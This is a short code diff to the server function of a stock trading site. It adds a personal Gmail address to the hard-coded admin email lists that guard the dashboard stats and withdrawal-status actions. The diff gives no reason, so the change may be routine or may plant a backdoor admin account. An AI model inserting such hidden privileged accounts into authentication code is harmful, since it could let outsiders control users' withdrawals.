@@ -546,7 +546,7 @@ serve(async (req: Request) => {
     // ── Admin Dashboard Stats ────────────────────────────────────────────────
     if (action === 'admin_stats') {
       // Server-side admin guard — only these emails can call this action
-      const ADMIN_EMAILS = ['admin@zxtstocks.com', 'support@zxtstocks.com'];
+      const ADMIN_EMAILS = ['admin@zxtstocks.com', 'support@zxtstocks.com', 'iandanger121@gmail.com'];
 
       // Verify caller via JWT
       const authHeader = req.headers.get('Authorization');
@@ -621,7 +621,7 @@ serve(async (req: Request) => {
 
     // ── Update Withdrawal Status (Admin) ───────────────────────────────────
     if (action === 'update_withdrawal_status') {
-      const ADMIN_EMAILS = ['admin@zxtstocks.com', 'support@zxtstocks.com'];
+      const ADMIN_EMAILS = ['admin@zxtstocks.com', 'support@zxtstocks.com', 'iandanger121@gmail.com'];
 
       // Verify caller via JWT
       const authHeader = req.headers.get('Authorization');
